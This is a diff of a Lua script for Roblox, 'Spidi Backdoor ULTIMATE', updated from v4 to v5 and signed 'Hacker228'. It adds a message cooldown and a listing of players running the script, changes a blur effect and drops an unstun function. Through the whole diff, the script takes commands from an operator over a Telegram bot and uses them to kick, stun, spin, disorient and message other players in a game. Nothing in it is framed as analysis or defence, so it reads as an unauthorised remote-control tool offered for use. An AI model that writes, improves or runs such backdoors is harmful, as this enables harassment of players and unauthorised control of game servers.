@@ -8,7 +8,7 @@
 ]=]
 
 print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v4")
+print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v5")
 print("[Spidi] ========================================")
 
 repeat wait() until game:IsLoaded()
@@ -114,7 +114,19 @@ local function findPlayer(input)
     else return nil, "Игрок не найден (скрипт не активен)" end
 end
 
--- ==================== ФУНКЦИЯ DES (ДЕЗОРИЕНТАЦИЯ) ====================
+-- ==================== КД НА СООБЩЕНИЯ ====================
+local messageCooldown = {}
+local function canSendMessage(player)
+    local userId = player.UserId
+    local last = messageCooldown[userId] or 0
+    if tick() - last < 0.3 then
+        return false
+    end
+    messageCooldown[userId] = tick()
+    return true
+end
+
+-- ==================== ФУНКЦИЯ DES ====================
 local function desorientPlayer(target)
     local char = target.Character
     if not char then return end
@@ -197,22 +209,7 @@ local function stunPlayer(target)
     end)
 end
 
-local function unstunPlayer(target)
-    if stunnedPlayers[target.UserId] then
-        local data = stunnedPlayers[target.UserId]
-        local char = target.Character
-        if char then
-            local hum = char:FindFirstChild("Humanoid")
-            if hum then
-                hum.WalkSpeed = data.speed
-                hum.JumpPower = data.jump
-            end
-        end
-        stunnedPlayers[target.UserId] = nil
-    end
-end
-
--- ==================== ФУНКЦИЯ SPIN (ВЕЧНЫЙ) ====================
+-- ==================== ФУНКЦИЯ SPIN ====================
 local spinningPlayers = {}
 local function spinPlayer(target, speed)
     speed = speed or 1
@@ -266,13 +263,14 @@ local function handleCommand(cmd, args, username)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v4 активирован!\n"..info)
+        sendMessage("✅ Spidi Backdoor ULTIMATE v5 активирован!\n"..info)
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI v4:</b>\n\n"..
+        sendMessage("📋 <b>КОМАНДЫ SPIDI v5:</b>\n\n"..
             "<b>👤 ИГРОКИ:</b>\n"..
+            "/sp - показать список пользователей\n"..
             "/sp [ник/номер] - выбрать игрока\n"..
             "/players - список пользователей\n"..
             "/kick [ник/номер] - кикнуть\n"..
@@ -313,7 +311,21 @@ local function handleCommand(cmd, args, username)
     if cmd == "sp" then
         local input = args[1]
         if not input then
-            sendMessage("❌ Укажи ник или номер: /sp [ник/номер]")
+            -- Показываем список всех пользователей
+            local list = {}
+            local i = 1
+            for _, p in pairs(Players:GetPlayers()) do
+                if scriptUsers[p.UserId] then
+                    local sel = (selectedPlayer and selectedPlayer.UserId == p.UserId) and " ✅ ВЫБРАН" or ""
+                    table.insert(list, i..". "..p.Name..sel)
+                    i = i + 1
+                end
+            end
+            if #list == 0 then
+                sendMessage("👥 Пользователей скрипта: 0")
+            else
+                sendMessage("👥 <b>Пользователи скрипта:</b>\n"..table.concat(list, "\n").."\n\n/sp [номер] - выбрать игрока")
+            end
             return
         end
         local target, err = findPlayer(input)
@@ -408,7 +420,6 @@ local function handleCommand(cmd, args, username)
     local target = nil
     local err = nil
     
-    -- Если есть выбранный игрок и команда без аргументов
     if not input and selectedPlayer then
         target = selectedPlayer
     elseif input then
@@ -427,6 +438,10 @@ local function handleCommand(cmd, args, username)
     local humanoid = char and char:FindFirstChild("Humanoid")
     
     if cmd == "message" then
+        if not canSendMessage(target) then
+            sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
+            return
+        end
         local msg = table.concat(args, " ", 2)
         if msg == "" or msg == input then
             sendMessage("❌ Введи текст: /message ник текст")
@@ -625,10 +640,13 @@ local function handleCommand(cmd, args, username)
     if cmd == "warp" then
         local level = tonumber(args[2]) or 5
         level = math.clamp(level, 1, 10)
-        local blur = Instance.new("BlurEffect")
-        blur.Name = "SpidiWarp"
+        local blur = Lighting:FindFirstChild("SpidiWarp")
+        if not blur then
+            blur = Instance.new("BlurEffect")
+            blur.Name = "SpidiWarp"
+            blur.Parent = Lighting
+        end
         blur.Size = level * 3
-        blur.Parent = Lighting
         sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
         return
     end
@@ -682,7 +700,7 @@ local function pollUpdates()
                     local msg = update.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v4 запущен!\n👤 Hacker228")
+                        sendMessage("✅ Spidi Backdoor ULTIMATE v5 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -750,7 +768,7 @@ local function createGUI()
     title.BackgroundTransparency = 1
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
-    title.Text = "Spidi Backdoor ULTIMATE v4"
+    title.Text = "Spidi Backdoor ULTIMATE v5"
     title.TextColor3 = Color3.fromRGB(0, 255, 0)
     title.TextSize = 28
     title.Font = Enum.Font.GothamBold
@@ -761,7 +779,7 @@ local function createGUI()
     desc.BackgroundTransparency = 1
     desc.Size = UDim2.new(1, -40, 0, 80)
     desc.Position = UDim2.new(0, 20, 0, 70)
-    desc.Text = "Spidi Backdoor Active!\n50+ Commands Available"
+    desc.Text = "Spidi Backdoor Active!\n/sp - выбрать игрока"
     desc.TextColor3 = Color3.fromRGB(0, 255, 0)
     desc.TextSize = 18
     desc.Font = Enum.Font.GothamBold
@@ -838,11 +856,11 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v4 запущен!\n👤 Hacker228\n📋 /sp [ник] - выбрать игрока, /help - все команды")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v5 запущен!\n👤 Hacker228\n📋 /sp - выбрать игрока, /help - все команды")
 end
 
 print("[Spidi] ========================================")
 print("[Spidi] ✅ СКРИПТ ЗАПУЩЕН!")
-print("[Spidi] 📌 /sp [ник] - выбрать игрока")
+print("[Spidi] 📌 /sp - список пользователей и выбор")
 print("[Spidi] 📌 /help - все команды")
 print("[Spidi] ========================================")
